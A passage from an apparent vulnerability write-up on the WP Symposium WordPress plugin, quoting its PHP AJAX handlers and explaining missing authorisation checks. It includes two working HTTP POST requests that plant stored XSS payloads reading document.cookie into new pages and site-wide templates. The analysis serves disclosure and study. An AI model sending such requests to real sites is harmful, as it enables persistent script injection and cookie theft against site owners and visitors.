id="crayon-53c98e7aa8c8c996702345-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-sy">[</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-71"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'/?p='</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-72"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET guid = '%s' WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-73"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">url</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-74"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-75"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-76"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-77"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0135 seconds] -->
<p>This long bit of code will effectively take in any arbitrary text input and add a new page with said input. As there&#8217;s no validation of the current user being authenticated, leave alone being an user with appropiate privileges to do this, we can exploit this to pull off a persistent XSS by adding a new page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa8c97861356730" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

action=add_new_page&amp;name=Hello this is dog&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa8c97861356730-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c97861356730-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa8c97861356730-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c97861356730-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa8c97861356730-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c97861356730-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa8c97861356730-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c97861356730-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e7aa8c97861356730-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c97861356730-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">93</span></div><div class="crayon-line" id="crayon-53c98e7aa8c97861356730-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c97861356730-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_new_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">Hello </span><span class="crayon-r">this</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">dog</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0031 seconds] -->
<p><strong>Analysis of import_template_file vulnerability</strong><br />
The last vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> is a bit more fun, because it does not directly touch the DB in this code. Rather, it uses the symposium_update_import_snippet function to extraplote a value to insert into the database through <a href="http://codex.wordpress.org/Function_Reference/update_option">update_option</a>. By being a bit crafty with our request, we can once again cause a persistent XSS due to a lack of validation of the calling user, since we can ship our payload into parts of the template, many of which are used by *most* pages.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa8ca1077215623" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "import_template_file") {

	$import_file = $_POST['import_file'];
	
	symposium_update_import_snippet("template_profile_header", $import_file);
	symposium_update_import_snippet("template_profile_body", $import_file);
	symposium_update_import_snippet("template_page_footer", $import_file);
	symposium_update_import_snippet("template_email", $import_file);
	symposium_update_import_snippet("template_forum_header", $import_file);
	symposium_update_import_snippet("template_mail", $import_file);
	symposium_update_import_snippet("template_mail_tray", $import_file);
	symposium_update_import_snippet("template_mail_message", $import_file);
	symposium_update_import_snippet("template_group", $import_file);
	symposium_update_import_snippet("template_forum_category", $import_file);
	symposium_update_import_snippet("template_forum_topic", $import_file);
	symposium_update_import_snippet("template_group_forum_category", $import_file);
	symposium_update_import_snippet("template_group_forum_topic", $import_file);

	echo 'OK';
	exit;
}
function symposium_update_import_snippet($tag, $import_file) {
	global $wpdb;
	$start = strpos($import_file, "&lt;!-- ".$tag." --&gt;") + strlen("&lt;!-- ".$tag." --&gt;")+1;
	$end = strpos($import_file, "&lt;!-- end_".$tag." --&gt;");
	$snippet = substr($import_file, $start, $end-$start-1);
	update_option('symposium_'.$tag, $snippet);
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa8ca1077215623-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8ca1077215623-28">28</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"import_template_file"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-2">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">import_file</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'import_file'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_profile_body"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_page_footer"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_email"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_header"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_tray"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_mail_message"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_category"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-s">"template_group_forum_topic"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-18">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-21"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-22"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">symposium_update_import_snippet</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;!-- "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strpos</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;!-- end_"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">tag</span><span class="crayon-sy">.</span><span class="crayon-s">" --&gt;"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">snippet</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">substr</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">import_file</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-st">end</span><span class="crayon-o">-</span><span class="crayon-sy">$</span><span class="crayon-i">start</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8ca1077215623-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">update_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">tag</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">snippet</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8ca1077215623-28"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0101 seconds] -->
<p>In our request, we need to add a bit of whatespace around our payload to allow for a margin of error, because the way it does the substringing isn&#8217;t that nice. This request will show how to do a simple alert, which will show on most pages on the site.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa8cac562410308" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 167

action=import_template_file&amp;import_file=&lt;!-- template_forum_header --&gt;           &lt;script&gt;alert(document.cookie); &lt;/script&gt;           &lt;!-- end_template_forum_header --&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa8cac562410308-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8cac562410308-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa8cac562410308-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8cac562410308-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa8cac562410308-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8cac562410308-6">6</div></div>
				</td>
